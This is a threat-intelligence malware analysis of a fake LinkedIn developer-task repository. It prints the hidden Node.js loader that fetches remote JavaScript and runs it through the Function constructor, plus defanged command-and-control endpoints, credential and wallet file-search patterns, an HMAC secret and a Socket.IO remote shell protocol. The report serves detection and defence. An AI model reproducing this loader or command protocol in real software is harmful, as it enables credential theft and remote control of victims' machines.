---
title: "Estokkyam/YAMTOKEN: Server-Side Import Chain Hides NPoint Staging and Socket.IO Control Payloads"
date: 2026-05-06
author: "ThreatProphet"
description: "Analysis of a LinkedIn recruitment-themed Bitbucket developer task that hides a server-side Node.js execution chain in blockchain RPC configuration, retrieves an obfuscated NPoint payload, and deploys browser, wallet, sensitive-file, clipboard, and Socket.IO command-control modules."
tags:
  - dprk-linked
  - contagious-interview
  - javascript
  - node-js
  - bitbucket
  - linkedin-lure
  - npoint
  - socket-io
  - blockchain
  - wallet-theft
  - infostealer
  - rat
  - credential-harvesting
categories:
  - malware-analysis
  - threat-intelligence
tlp: "CLEAR"
mitre_techniques:
  - T1566.003
  - T1204.002
  - T1059.007
  - T1059.001
  - T1027
  - T1140
  - T1105
  - T1071.001
  - T1005
  - T1016
  - T1033
  - T1082
  - T1115
  - T1552.001
  - T1555.003
  - T1041
report_id: "TP-2026-012"
showToc: true
---

> *The chain was not in the hook this time; it was hidden behind the contract.*

## Executive Summary

This report analyzes a recruitment-themed developer task delivered through a Bitbucket repository operating under the name **estokkyam**.The target was contacted through LinkedIn with a job offer and was given a Google Doc containing task instructions and a Bitbucket repository link. The repository presented as a plausible React/Node.js blockchain application named `YAMTOKEN`.

The malicious behavior was not implemented through Git hooks or VS Code workspace tasks. Instead, the execution chain was hidden in the backend server path. Running the project through the normal npm workflow starts the backend with `node server`. The backend loads the authentication route, which loads authentication middleware, which imports `server/config/getContract.js`. That module contains a function named `callHashedContract()`, and the auth middleware invokes it during module initialization.

The staging URL is concealed among legitimate-looking blockchain RPC constants in `server/config/constant.js`:

```javascript
const Hashed = "hxxps://api.npoint[.]io/d5cceef8fa81cee50c7b"
```

When the backend is started, `callHashedContract()` retrieves the NPoint document, extracts `res.data.cookie`, and passes it into an execution sink based on the JavaScript `Function` constructor:

```javascript
const handler = new Function('require', errCode);
handlerFunc(require);
```

The JavaScript snippets and URLs in this report are defanged where appropriate for publication. Exact values are preserved in the private evidence set and public hash material.

The recovered NPoint stage is heavily obfuscated. Safe deobfuscation produced three readable Node.js payloads:

| Payload | SHA-256 | Role |
|---|---|---|
| `ldb-browser-collector.js` | `3d7541bfc7ec43e1fea063ff29922a517303afb416223ba00020c8e26b4fabda` | Browser profile, credential-store, and wallet-extension collector |
| `auto-file-uploader.js` | `ea7d02d42307a5411fea9f9a1f6acc0b125a21584b6e88aa8a55fccec533f574` | Recursive sensitive-file scanner and uploader |
| `socket-controller.js` | `614a9e2ae73d072e66f08e59cd84ffd985ad73faa07a85df3210358e1709209f` | Socket.IO command controller, clipboard monitor, process launcher, and file-control module |

The payload infrastructure centers on `144.172.89[.]180` across TCP ports `8085`, `8086`, and `8087`. The Socket.IO controller uses `ws[:]//144.172.89[.]180:8087`, registers the host through `/api/notify`, logs through `/api/log`, uploads browser/file material through `/upload` and `/api/upload-file`, and accepts command events that support directory listing, arbitrary shell command execution, file read/upload, and child-process control. Follow-up RDAP/WHOIS/PTR enrichment places `144.172.89[.]180` in the `144.172.89.0/24` RouterHosting allocation, with Cloudzy abuse contact metadata and PTR `180.89.172.144.static.cloudzy.com`. Active service fingerprinting further indicates an Ubuntu Linux host, based on the OpenSSH banner `OpenSSH 9.6p1 Ubuntu 3ubuntu13.16` on TCP/22, with Node.js Express services exposed on TCP/8085-8087.

The technical linkage between the Bitbucket repository, backend module-load chain, NPoint payload, and decoded child modules is assessed with **high confidence**. Alignment with DPRK-linked Contagious Interview-style developer targeting is assessed with **low-to-medium confidence** based on the recruitment pretext, developer-task workflow, blockchain/Web3 theme, hidden Node.js execution chain, browser/wallet theft, and remote command capability. This report does not contain a single artifact sufficient for definitive state attribution.

## Evidence Basis and Scope

This report is based on preserved repository metadata, local source files, npm script analysis, backend import-chain analysis, controlled retrieval of the NPoint payload, safe static deobfuscation, static analysis of the extracted Node.js payloads, extraction of Socket.IO command protocol details, and passive infrastructure enrichment for `144.172.89[.]180`. Payloads were **not executed** against a real host environment.

The evidence archive is not distributed with this public report. Public comparison material is provided through hashes, defanged URLs, code-path indicators, command/event names, protocol fields, and behavioral descriptions. Local evidence paths are avoided in the public body except where an artifact label is required for hash comparison.

Claims are separated into three categories:

- **Directly observed:** present in preserved repository contents, captured payloads, decoded payloads, commit metadata, or command-protocol analysis.
- **Behavioral assessment:** inferred from recovered source code and decoded payload logic.
- **External/campaign context:** based on overlap with previous ThreatProphet reporting and public reporting on fake developer interview operations, but not used alone to prove attribution.

## Key Findings

| Finding | Assessment |
|---|---|
| Initial access vector | LinkedIn recruitment approach followed by Google Doc task instructions and Bitbucket repository link |
| Repository | `bitbucket[.]org/estokkyam/estokkyam/src/master/` |
| Lure theme | Blockchain / React / Node.js developer task |
| Visible project name | `YAMTOKEN` |
| Execution trigger | `npm start` or `npm run dev` starts `node server` |
| Hidden execution path | Backend auth route loads auth middleware, which imports `getContract.js` and invokes `callHashedContract()` |
| Staging host | `api.npoint[.]io` |
| Stage URL | `hxxps://api.npoint[.]io/d5cceef8fa81cee50c7b` |
| Execution sink | `new Function('require', errCode)` |
| Main C2 IP | `144.172.89[.]180` |
| C2 ports | `8085`, `8086`, `8087` |
| Campaign/runtime marker | `ukey: 303`, `t: 3` |
| HMAC secret | `SuperStr0ngSecret@)@^` |
| Extracted payloads | Browser/wallet collector, sensitive-file uploader, Socket.IO controller |
| Attribution | Low-to-medium confidence DPRK-linked / Contagious Interview consistency, not definitive |

---

## Attack Overview

### Initial Contact

The target was contacted through LinkedIn with a job offer. The task instructions were provided through a Google Doc, which linked to a Bitbucket repository:

```text
hxxps://bitbucket[.]org/estokkyam/estokkyam/src/master/
```

The repository was framed as a developer task. This is consistent with the broader fake developer interview pattern: a normal-looking project is provided to the target, and the malicious chain depends on the target running expected development commands.

### Repository Metadata

The preserved commit metadata shows two commits by the same persona:

```text
Dan Merfi <danxeth436@gmail.com>
```

Observed commits:

| Commit | Author / Committer | Timestamp | Subject |
|---|---|---|---|
| `e43be2b5d9b221dc5ccb78a0bc7aac233bc2d7e2` | `Dan Merfi <danxeth436@gmail.com>` | `2026-05-05T21:55:33+09:00` | `initial commit` |
| `13d37378235e330c0e55862a991e3cf3e3c79aa9` | `Dan Merfi <danxeth436@gmail.com>` | `2026-05-05T10:33:03Z` | `Initial commit` |

The `+09:00` timestamp is useful as a pivot but should not be treated as reliable operator geography. It may reflect a configured development environment, automated tooling, or actor-controlled repository metadata.

### Kill Chain

```text
LinkedIn job approach
  -> Google Doc with task instructions and Bitbucket repository link
  -> victim clones/runs the React/Node.js project
  -> package.json starts backend via node server
  -> server.js loads /api/auth route
  -> auth route loads auth middleware
  -> auth middleware imports getContract.js
  -> auth middleware invokes callHashedContract() during module initialization
  -> getContract.js retrieves hxxps://api.npoint[.]io/d5cceef8fa81cee50c7b
  -> res.data.cookie passed into new Function('require', ...)
  -> obfuscated NPoint stage executes
  -> three readable child payloads recovered:
       1. browser/wallet collector
       2. recursive sensitive-file uploader
       3. Socket.IO command controller
  -> C2 and upload activity to 144.172.89[.]180:8085/8086/8087
```

---

## Technical Analysis

### Stage 0: npm Workflow as Execution Trigger

The root `package.json` identifies the project as:

```json
{
  "name": "YAMTOKEN",
  "version": "0.2.0"
}
```

The relevant scripts are:

```json
{
  "kill-port": "kill-port 5025",
  "server": "node server",
  "start": "npm-run-all --parallel kill-port server client",
  "dev": "npm-run-all --parallel kill-port server client",
  "client": "react-scripts start"
}
```

This means the backend executes during ordinary project startup. A victim following typical developer-task instructions would likely run:

```bash
npm install
npm start
# or
npm run dev
```

The suspicious behavior begins on server startup rather than through an obvious lifecycle hook such as `postinstall`, `preinstall`, or `prepare`.

### Stage 1: Backend Import Chain

The backend route structure produces a hidden module-load execution chain:

```text
package.json
  -> npm start / npm run dev
  -> node server
  -> server.js
  -> app.use('/api/auth', require('./server/routes/api/auth'))
  -> server/routes/api/auth.js
  -> require('../../middleware/auth')
  -> server/middleware/auth.js
  -> require('../config/getContract')
  -> callHashedContract()
```

The repository execution chain is now supported by three derived outputs: the corrected npm/import-chain summary, a line-level execution-chain exhibit, and a malicious-path file-hash inventory. These outputs confirm that the selected worktree is `evidence/working/estokkyam`, that `server`, `start`, and `dev` launch the backend, and that the import path reaches `callHashedContract()` before the NPoint `cookie` field is executed through `new Function('require', ...)`. The critical source file hash remains:

```text
a816fe1bf50646eb8555253517c77c211ce8ccc13cacdc88261e54213bd28123  server/config/getContract.js
```

The `auth.js` middleware imports a large group of blockchain-looking contract functions:

```javascript
const {
  callEthContract,
  callPolygonContract,
  callBscContract,
  callArbitrumContract,
  callAvalancheContract,
  callFantomContract,
  callHarmonyContract,
  callHecoContract,
  callKlayContract,
  callMaticContract,
  callMoonbeamContract,
  callHashedContract,
  callOptimismContract,
  callPalmContract,
  callRoninContract,
  callXDaiContract
} = require('../config/getContract')
```

Only `callHashedContract()` is invoked immediately:

```javascript
const HashedContact = (() => {
  callHashedContract();
})();
```

This is the critical server-side trigger.

### Stage 2: NPoint URL Hidden Among RPC Constants

The `constant.js` file contains many legitimate-looking blockchain RPC URLs:

```javascript
const EthMainnet = "https://mainnet.infura.io/v3/11ab759d189dc8bc238cb2525f05b88c"
const PolygonMainnet = "https://polygon-mainnet.infura.io/v3/11ab759d189dc8bc238cb2525f05b88c"
const BscMainnet = "https://bsc-dataseed.binance.org"
...
const Hashed = "hxxps://api.npoint[.]io/d5cceef8fa81cee50c7b"
...
```

The NPoint URL is concealed as a constant named `Hashed`, which is exported with the other blockchain RPC constants:

```javascript
module.exports =  {
  EthMainnet,
  PolygonMainnet,
  BscMainnet,
  ...
  Hashed,
  ...
};
```

This placement is deliberate camouflage. It makes the malicious URL look like part of a blockchain RPC configuration block.

### Stage 3: Function Constructor Execution Sink

`getContract.js` imports the `Hashed` constant and assigns it to `GET_HASHED_URL`:

```javascript
const GET_HASHED_URL = Hashed;
```

The staging function retrieves the NPoint resource and passes the returned `cookie` field to `errorHandler()`:

```javascript
const callHashedContract = () => {
    axios.get(GET_HASHED_URL)
    .then(res=>errorHandler(res.data.cookie))
    .catch(err=>{try {
        // errorHandler(err.response.data);
    } catch (error) {

    }});
}
```

The execution sink is inside `errorHandler()`:

```javascript
const createHandler = (errCode) => {
  try {
    const handler = new Function('require', errCode);
    return handler;
  } catch (e) {
    console.error('Failed:', e.message);
    return null;
  }
};

const handlerFunc = createHandler(error);

if (handlerFunc) {
  handlerFunc(require);
}
```

This turns the remote NPoint `cookie` field into executable JavaScript with access to Node.js `require`.

The cleaned exhibit confirms the relevant source lines:

```text
package.json:54:    "server": "node server",
package.json:55:    "start": "npm-run-all --parallel kill-port server client",
package.json:56:    "dev": "npm-run-all --parallel kill-port server client",
server.js:15:app.use('/api/auth', require('./server/routes/api/auth'));
server/routes/api/auth.js:4:const auth = require('../../middleware/auth');
server/middleware/auth.js:2:const { ..., callHashedContract, ... } = require('../config/getContract')
server/middleware/auth.js:48:const HashedContact = (() => {
server/middleware/auth.js:49:  callHashedContract();
server/config/constant.js:13:const Hashed = "hxxps://api.npoint[.]io/d5cceef8fa81cee50c7b"
server/config/getContract.js:15:const GET_HASHED_URL = Hashed;
server/config/getContract.js:131:const callHashedContract = () => {
server/config/getContract.js:132:    axios.get(GET_HASHED_URL)
server/config/getContract.js:133:    .then(res=>errorHandler(res.data.cookie))
server/config/getContract.js:181:const errorHandler = (error) => {
server/config/getContract.js:190:          const handler = new Function('require', errCode);
server/config/getContract.js:201:        handlerFunc(require);
```

### Stage 4: NPoint Payload

The captured NPoint payload body had the following SHA-256:

```text
ad1ccb6d5d5df352e37ffb284acfb57cdab293a3a4378e77ff4c859006cf0120
```

The NPoint payload was captured from:

```text
hxxps://api.npoint[.]io/d5cceef8fa81cee50c7b
```

The body was heavily obfuscated and contained high-density encoded material. Safe extraction produced three readable child payloads:

| Extracted payload | Size | SHA-256 |
|---|---:|---|
| `ldb-browser-collector.js` | 35,088 bytes | `3d7541bfc7ec43e1fea063ff29922a517303afb416223ba00020c8e26b4fabda` |
| `auto-file-uploader.js` | 30,760 bytes | `ea7d02d42307a5411fea9f9a1f6acc0b125a21584b6e88aa8a55fccec533f574` |
| `socket-controller.js` | 68,967 bytes | `614a9e2ae73d072e66f08e59cd84ffd985ad73faa07a85df3210358e1709209f` |

The recovered child payloads are distinct functional modules. They overlap through common infrastructure, runtime markers, and HMAC validation logic.

---

## Payload Capability Analysis

### Module 1: `ldb-browser-collector.js`

The browser collector targets Chromium-family browser data. It searches for profile files including:

```text
Local State
Login Data
Login Data For Account
```

It also includes Brave wallet collection logic and browser profile enumeration across operating systems. The collector prepares file metadata and uploads collected material to:

```text
hxxp://144.172.89[.]180:8085/upload
```

The upload request uses multipart form data and includes validation headers generated with:

```text
SuperStr0ngSecret@)@^
```

The collector sends host and file metadata including:

```text
userkey: 303
t: 3
hostname: <hostname>
file-metadata: <JSON metadata array>
validation: HMAC-SHA256(...)
```

Observed target categories:

```text
browser Local State
browser Login Data
browser Login Data For Account
Brave browser wallet material
Chromium profile material
extension storage
```

Assessment: this module is a browser credential and wallet-extension collector.

### Module 2: `auto-file-uploader.js`

The auto-uploader recursively scans directories for sensitive files. It uploads matches to:

```text
hxxp://144.172.89[.]180:8086/upload
```

The payload uses the same campaign markers and HMAC secret:

```text
userkey: 303
t: 3
SuperStr0ngSecret@)@^
```

Recovered search patterns include:

```text
.env
config
metamask
phantom
bitcoin
ethereum
wallet
coinbase
exodus
ledger
trezor
keystore
privatekey
keypair
id_rsa
id_ed25519
seed
mnemonic
recovery phrase
password
api_key
token
cookie
hardhat
truffle
.solana
.kdbx
.sqlite
.pdf
.docx
.json
.js
.ts
```

Assessment: this module is a broad credential, wallet, source-code, and document collector. Its file patterns show explicit interest in cryptocurrency wallets, private keys, seed phrases, development secrets, password databases, and project configuration files.

### Module 3: `socket-controller.js`

The Socket.IO controller is the primary interactive control module. It connects to:

```text
ws[:]//144.172.89[.]180:8087
```

It also communicates with:

```text
hxxp://144.172.89[.]180:8087/api/notify
hxxp://144.172.89[.]180:8087/api/log
hxxp://144.172.89[.]180:8085/api/upload-file
```

The controller registers the host before connecting to the socket server.

Host registration payload:

```json
{
  "ukey": 303,
  "t": 3,
  "host": "303_<hostname>",
  "os": "<os type> <os release>",
  "username": "<username>",
  "timestamp": "<unix seconds>"
}
```

Registration headers include:

```text
Content-Type: application/json
validation: HMAC-SHA256("<username>|<timestamp>", "SuperStr0ngSecret@)@^")
```

The same controller logs clipboard changes and status messages to `/api/log`.

Clipboard/log payload structure:

```json
{
  "ukey": 303,
  "t": 3,
  "host": "303_<hostname>",
  "os": "<os type> <os release>",
  "username": "<username>",
  "message": "<message or clipboard content>",
  "level": "info",
  "data": {},
  "timestamp": "<unix seconds>"
}
```

Assessment: this module provides persistent operator interaction and orchestration. It supports host registration, process-status reporting, remote command execution, file browsing, file upload, child module process control, and clipboard monitoring.

---

## Socket.IO Command Protocol

### C2 Configuration

| Item | Value |
|---|---|
| Notify endpoint | `hxxp://144.172.89[.]180:8087/api/notify` |
| Log endpoint | `hxxp://144.172.89[.]180:8087/api/log` |
| Socket.IO endpoint | `ws[:]//144.172.89[.]180:8087` |
| LDB/file upload endpoint | `hxxp://144.172.89[.]180:8085/api/upload-file` |
| Auto-upload endpoint | `hxxp://144.172.89[.]180:8086/upload` |
| Campaign/user key | `303` |
| Type marker | `3` |
| HMAC secret | `SuperStr0ngSecret@)@^` |

Client socket configuration:

```javascript
io("ws[:]//144.172.89[.]180:8087", {
  reconnectionAttempts: 15,
  reconnectionDelay: 2000,
  timeout: 20000
});
```

### Inbound Events

| Event | Direction | Input fields | Behavior |
|---|---|---|---|
| `connect` | lifecycle | none | Emits `processStatus`, then schedules `.env` search/upload after five minutes |
| `connect_error` | lifecycle | error object | Logs connection failure |
| `whour` | server -> client | none | Client replies with `whoIm` |
| `command` | server -> client | `{ message, code, cid, sid, path }` | Main dispatcher for directory listing, file upload/read, and shell execution |
| `disconnect` | lifecycle | none | Logs disconnection |
| `reconnect` | lifecycle | `attemptNumber` | Re-emits `processStatus` |
| `processControl` | server -> client | `{ scriptType, action }` | Starts/stops child modules using lock files and PIDs |

### Outbound Events

| Event | Direction | Payload | Trigger |
|---|---|---|---|
| `processStatus` | client -> server | `{ ldbScript, autoUploadScript, socketScript }` | On connect, reconnect, interval, and process-control actions |
| `whoIm` | client -> server | `{ ukey:303, t:3, host:"303_<hostname>", os, username }` | Response to `whour` |
| `message` | client -> server | Original command fields plus `result`, optional `fileUrl`, optional `type` | Response to `command` |

The derived Socket.IO event inventory confirms the expected event surface. Inbound handlers include `connect`, `connect_error`, `disconnect`, `error`, `reconnect`, `whour`, `command`, `processControl`, and process/lifecycle handlers such as `SIGINT`, `SIGTERM`, `close`, `exit`, `uncaughtException`, and `unhandledRejection`. Outbound emissions are limited to `message`, `processStatus`, and `whoIm`.

### Command Event

The command handler extracts:

```javascript
const { message: command, code, cid, sid, path: filePath } = msg;
```

#### Code `102`: Directory Listing

Condition:

```javascript
code === "102" && filePath
```

Behavior:

- Strips trailing `+` from `path`.
- Requires path to exist and be a directory.
- Reads immediate children using `fs.readdirSync()`.
- Returns file/directory metadata as JSON.

Response schema:

```json
{
  "...originalMsg": "...",
  "result": "[{\"name\":\"...\",\"path\":\"...\",\"type\":\"dir|file\",\"size\":123,\"date\":\"...\"}]"
}
```

#### Code `108`: Upload Immediate Child Files from Directory

Condition:

```javascript
code === "108" && filePath
```

Behavior:

- Strips trailing `+` from `path`.
- Requires path to exist and be a directory.
- Reads immediate child files only.
- Skips directories.
- Uses a 25 MB per-file limit.
- Uploads through `144.172.89[.]180:8085/api/upload-file`.

Response schema:

```json
{
  "...originalMsg": "...",
  "code": "108",
  "result": "{\"path\":\"...\",\"uploads\":[...],\"skipped\":[...],\"totalBytes\":123,\"maxBytesPerFile\":26214400}"
}
```

#### Code `107`: Shell Command Plus File Read/Upload

Condition:

```javascript
code === "107" && filePath
```

Behavior:

- Executes `message` through `child_process.exec()`.
- Reads the file at `path` if present.
- Uploads file content through `uploadFileToLdb()`.
- Sends inline output for smaller content.
- Returns `fileUrl` for larger uploaded content.

Response schema:

```json
{
  "...originalMsg": "...",
  "result": "<stdout or null>",
  "fileUrl": "<optional uploaded file URL>"
}
```

#### Default Command Handling

All other `command` messages execute `message` directly through:

```javascript
exec(command, { windowsHide: true, maxBuffer: 1024 * 1024 * 300 }, callback)
```

Assessment: the default branch provides arbitrary shell command execution.

### Process-Control Protocol

Input structure:

```json
{
  "scriptType": "ldbScript|autoUploadScript|socketScript",
  "action": "start|stop"
}
```

Lock files:

```text
pid.3.1.lock  -> ldbScript
pid.3.2.lock  -> autoUploadScript
pid.3.3.lock  -> socketScript
```

`stop` reads the PID from the lock file and kills the process. `start` launches embedded child payload code through Node.js.

---

## Infrastructure Analysis

### Network Infrastructure

| Indicator | Type | Role |
|---|---|---|
| `api.npoint[.]io` | Domain | Stage-1 payload host |
| `hxxps://api.npoint[.]io/d5cceef8fa81cee50c7b` | URL | Obfuscated NPoint payload |
| `144.172.89[.]180` | IPv4 | Main payload C2 and upload host |
| `144.172.89[.]180:8085` | Host:port | Browser collector and file upload service |
| `hxxp://144.172.89[.]180:8085/upload` | URL | Browser collector upload endpoint |
| `hxxp://144.172.89[.]180:8085/api/upload-file` | URL | Socket controller file upload endpoint |
| `144.172.89[.]180:8086` | Host:port | Auto-file-uploader service |
| `hxxp://144.172.89[.]180:8086/upload` | URL | Sensitive-file upload endpoint |
| `144.172.89[.]180:8087` | Host:port | Socket.IO control and logging service |
| `hxxp://144.172.89[.]180:8087/api/notify` | URL | Host registration endpoint |
| `hxxp://144.172.89[.]180:8087/api/log` | URL | Logging and clipboard exfil endpoint |
| `ws[:]//144.172.89[.]180:8087` | URL | Socket.IO command channel |

Passive infrastructure enrichment:

| Field | Observed value | Assessment |
|---|---|---|
| PTR | `180.89.172.144.static.cloudzy.com` | Cloudzy-style static PTR for the observed IP |
| Allocation | `144.172.89.0/24` | RouterHosting LLC allocation in ARIN/RDAP data |
| Parent allocation | `144.172.64.0/18` | FranTech/PONYNET parent allocation |
| Registration date for `144.172.89.0/24` | 2025-03-26 | Infrastructure context only; not attribution evidence |

Cloudzy/RouterHosting context is useful for infrastructure tracking and abuse reporting, but it should not be treated as attribution evidence by itself.

Active service fingerprinting adds operating-system context. An Nmap service scan of `144.172.89[.]180` resolved the PTR `180.89.172.144.static.cloudzy.com` and identified `OpenSSH 9.6p1 Ubuntu 3ubuntu13.16` on TCP/22, indicating an Ubuntu Linux host fingerprint. The same scan identified `vsftpd 3.0.5` on TCP/21 and Node.js Express services on TCP/8085, TCP/8086, and TCP/8087. Nmap also reported many `tcpwrapped` ports, so the broad open-port surface should be interpreted cautiously as possible filtering, wrapping, or scan-response behavior rather than proof that every listed service is functionally exposed.

This Linux fingerprint is analytically useful because prior ThreatProphet cases in the same broader developer-lure series, including TP-2026-007 and TP-2026-008, were assessed from service fingerprints as Windows-hosted infrastructure. The difference should be treated as infrastructure variation, not as an actor-separation indicator by itself. Operators can rotate between Windows and Linux VPS hosts while retaining the same staging schema, payload conventions, or C2 logic.

Active service fingerprint summary:

| Port | Service fingerprint | Assessment |
|---:|---|---|
| `21/tcp` | `vsftpd 3.0.5` | FTP service exposed on the same host |
| `22/tcp` | `OpenSSH 9.6p1 Ubuntu 3ubuntu13.16` | Ubuntu Linux host fingerprint |
| `8085/tcp` | `Node.js Express framework` | Browser/file upload service observed by payload and scan |
| `8086/tcp` | `Node.js Express framework` | Sensitive-file upload service observed by payload and scan |
| `8087/tcp` | `Node.js Express framework` | Socket.IO/logging/notify service observed by payload and scan |

### Runtime Markers

| Marker | Value |
|---|---|
| `ukey` | `303` |
| `t` | `3` |
| Host prefix | `303_<hostname>` |
| HMAC secret | `SuperStr0ngSecret@)@^` |

---

## Relationship to Prior ThreatProphet Reporting

This case fits the broader fake developer interview pattern documented across previous ThreatProphet investigations. The shared pattern includes:

```text
LinkedIn recruitment approach
developer-task pretext
blockchain/Web3 application theme
malicious behavior hidden inside normal development workflow
Node.js-based execution path
browser, wallet, and developer-secret targeting
remote command capability
```

However, this case is technically distinct from TP-2026-011 MansaTrade. The MansaTrade case used Git hooks, Short.io redirects, token-gated staged scripts, a descriptor service, and a multi-module JavaScript framework. The Estokkyam case instead uses a **server-side import chain** and **NPoint-hosted obfuscated JavaScript**.

The relationship should therefore be described as **cluster-level TTP alignment** and **schema-level tooling overlap**, not direct infrastructure reuse. The stronger internal linkage in this investigation is the chain from the Bitbucket repository to `api.npoint[.]io/d5cceef8fa81cee50c7b`, the recovered NPoint hash, and the three decoded child payloads using `144.172.89[.]180`.

### Cookie Field as Cross-Report Staging-Schema Marker

The `cookie` field is not a persistence mechanism. In this family of developer-lure payloads it functions as a remote JavaScript transport container: a JSON service returns a field named `cookie`, the loader reads that field through `data.cookie` or `res.data.cookie`, and the value is passed into a dynamic JavaScript execution sink such as `new Function('require', ...)` or a wrapper around a Function constructor.

This schema appears in prior ThreatProphet reporting and in Estokkyam:

| Report | Staging service | Payload field | Execution pattern | Assessment |
|---|---|---|---|---|
| TP-2026-007 Wallet Trap | JSONkeeper | `d.cookie` | `new Function('require', d.cookie)(require)` | Confirmed JSON `cookie` transport schema |
| TP-2026-008 Triple Fork | NPoint | `res.data.cookie` | `executeHandler(res.data.cookie)` -> Function-constructor execution | Confirmed NPoint `cookie` transport schema |
| TP-2026-012 Estokkyam | NPoint | `res.data.cookie` | `errorHandler(res.data.cookie)` -> `new Function('require', errCode)` | Confirmed NPoint `cookie` transport schema |

Assessment: this is a **schema-level tooling marker**, not standalone actor attribution. The confidence increases when the `cookie` transport field appears together with JSONkeeper or NPoint staging, Function-constructor execution, browser/wallet collection, `SuperStr0ngSecret@)@^`, `userkey`/`ukey`, `t`, Socket.IO control, or a similar split child-module payload structure. Current evidence is sufficient to describe schema-level overlap across TP-2026-007, TP-2026-008, and TP-2026-012. It is not sufficient to assert direct infrastructure reuse or the same operator based on the `cookie` field alone.

### Related Public Reporting: NIVEL4 ChainVisita

The overlap checks against public ChainVisita reporting produced a mixed result. The Estokkyam sample does **not** show the strongest ChainVisita-specific markers searched for here, such as `isillegalregion`, `checkRegion`, `x-secret-header`, `3aeb34a34`, `144.172.116.22`, or the exact ChainVisita-reported `userkey=204` / `t=2` pairing. Several broad `t=2` hits appeared in binary, image, font, trace, and packed artifacts and should be treated as false positives from overly broad pattern matching.

The meaningful overlap is at the tooling-family and payload-behavior level. Estokkyam contains the same validation secret `SuperStr0ngSecret@)@^` across decoded child modules and uses the same **campaign-key / type-marker schema** with different values: `ukey` / `userkey: 303` and `t: 3`. The same marker family appears in host registration, logging, upload headers, and Socket.IO controller logic. Estokkyam also implements browser/wallet collection, sensitive-file upload, Socket.IO command/control, clipboard/logging paths, and Function-constructor execution from a staged `cookie` field. These overlaps support describing ChainVisita as **related public reporting for the same broader developer-lure tooling pattern**, but they do not establish direct infrastructure reuse or a one-to-one campaign match.


## Attribution Assessment

Assessed attribution confidence: **Low to medium**

The campaign is consistent with publicly documented fake developer interview operations commonly tracked under Contagious Interview and related DPRK-linked reporting. The alignment is based on:

```text
LinkedIn recruitment approach
developer-task lure
blockchain/Web3 project framing
Node.js malware chain
browser and wallet data targeting
developer-secret collection
remote command capability
```

The ChainVisita comparison strengthens the broader tooling-family context because Estokkyam shares the `SuperStr0ngSecret@)@^` validation secret, similar browser/wallet collection behavior, and a comparable campaign-key/type-marker schema. The values differ (`ukey/userkey=303`, `t=3` rather than ChainVisita's reported `userkey=204`, `t=2`), and ChainVisita-specific infrastructure is absent, so this remains contextual tooling-family support rather than direct correlation.

The cross-report `cookie` transport pattern adds a separate schema-level clustering point with TP-2026-007 and TP-2026-008: JSON/NPoint staging returns executable JavaScript in a field named `cookie`, which is then passed into a Function-constructor execution sink. This supports tooling-family overlap but should not be treated as actor attribution by itself.

The evidence in this report remains technical and behavioral. No single recovered infrastructure item, commit identity, NPoint URL, email address, or payload string is sufficient to attribute the campaign to a specific state actor. The `Dan Merfi <danxeth436@gmail.com>` repository identity and the `+09:00` commit timestamp are useful pivots but should not be treated as real-world identity or location indicators without corroboration.

The report therefore uses two confidence levels:

| Assessment | Confidence | Basis |
|---|---:|---|
| Linkage to the Estokkyam/NPoint payload chain | High | Direct repository path, backend import chain, NPoint capture, decoded payloads, and hashes |
| Alignment with DPRK-linked Contagious Interview-style developer targeting | Low to medium | TTP overlap with developer recruitment, Web3 targeting, JavaScript malware, wallet/credential collection, and remote command functionality |

---

## MITRE ATT&CK Mapping

Socket.IO over WebSocket is mapped under `T1071.001` because MITRE treats WebSocket as a web protocol. `T1071.004` is DNS and is not used for this activity.

| Technique ID | Name | Tactic | Notes |
|---|---|---|---|
| T1566.003 | Spearphishing via Service | Initial Access | LinkedIn recruitment approach and Google Doc task link |
| T1204.002 | User Execution: Malicious File | Execution | Victim expected to run the developer project |
| T1059.007 | JavaScript | Execution | Obfuscated Node.js payload and decoded child modules |
| T1059.001 | PowerShell | Execution | Payload includes Windows PowerShell execution paths |
| T1027 | Obfuscated Files or Information | Defense Evasion | NPoint stage uses heavy JavaScript obfuscation |
| T1140 | Deobfuscate/Decode Files or Information | Defense Evasion | Runtime payload extraction and child module launch |
| T1105 | Ingress Tool Transfer | Command and Control | Payload retrieval from NPoint and module staging |
| T1071.001 | Web Protocols | Command and Control | HTTP endpoints for notify, log, upload |
| T1005 | Data from Local System | Collection | File scanner and upload modules |
| T1083 | File and Directory Discovery | Discovery | Directory listing and recursive sensitive-file discovery logic |
| T1016 | System Network Configuration Discovery | Discovery | Host metadata and environment collection |
| T1033 | System Owner/User Discovery | Discovery | Username included in host registration |
| T1082 | System Information Discovery | Discovery | OS, hostname, release, platform data |
| T1115 | Clipboard Data | Collection | Socket controller monitors clipboard changes |
| T1552.001 | Credentials In Files | Credential Access | `.env`, config, private keys, seed files, password databases |
| T1555.003 | Credentials from Web Browsers | Credential Access | Browser Login Data / Local State collection |
| T1041 | Exfiltration Over C2 Channel | Exfiltration | Upload endpoints used for stolen files and browser material |

---

## Indicators of Compromise

> All indicators assessed **High confidence** unless noted.

### Network Indicators

| Indicator | Type | Notes |
|---|---|---|
| `api.npoint[.]io` | Domain | Stage-1 payload hosting |
| `hxxps://api.npoint[.]io/d5cceef8fa81cee50c7b` | URL | Obfuscated payload source |
| `144.172.89[.]180` | IPv4 | C2 and upload infrastructure |
| `180.89.172.144.static.cloudzy.com` | PTR | Reverse DNS for `144.172.89[.]180`; infrastructure context |
| `144.172.89.0/24` | Netblock | RouterHosting allocation; Cloudzy abuse contact |
| `144.172.89[.]180:8085` | Host:port | Browser/upload service |
| `144.172.89[.]180:8086` | Host:port | Sensitive file upload service |
| `144.172.89[.]180:8087` | Host:port | Socket.IO/logging/notify service |
| `hxxp://144.172.89[.]180:8085/upload` | URL | Browser collector upload |
| `hxxp://144.172.89[.]180:8085/api/upload-file` | URL | File upload endpoint |
| `hxxp://144.172.89[.]180:8086/upload` | URL | Auto-file-uploader endpoint |
| `hxxp://144.172.89[.]180:8087/api/log` | URL | Logging and clipboard endpoint |
| `hxxp://144.172.89[.]180:8087/api/notify` | URL | Host registration endpoint |
| `ws[:]//144.172.89[.]180:8087` | URL | Socket.IO C2 channel |

### Repository and Identity Indicators

| Indicator | Type | Notes |
|---|---|---|
| `bitbucket[.]org/estokkyam/estokkyam` | Repository | Initial developer-task repository |
| `estokkyam` | Account / namespace | Bitbucket namespace |
| `Dan Merfi` | Git author / committer | Repository identity |
| `danxeth436@gmail[.]com` | Email | Git author / committer email |
| `e43be2b5d9b221dc5ccb78a0bc7aac233bc2d7e2` | Commit | `initial commit` |
| `13d37378235e330c0e55862a991e3cf3e3c79aa9` | Commit | `Initial commit` |

### File and Payload Hashes

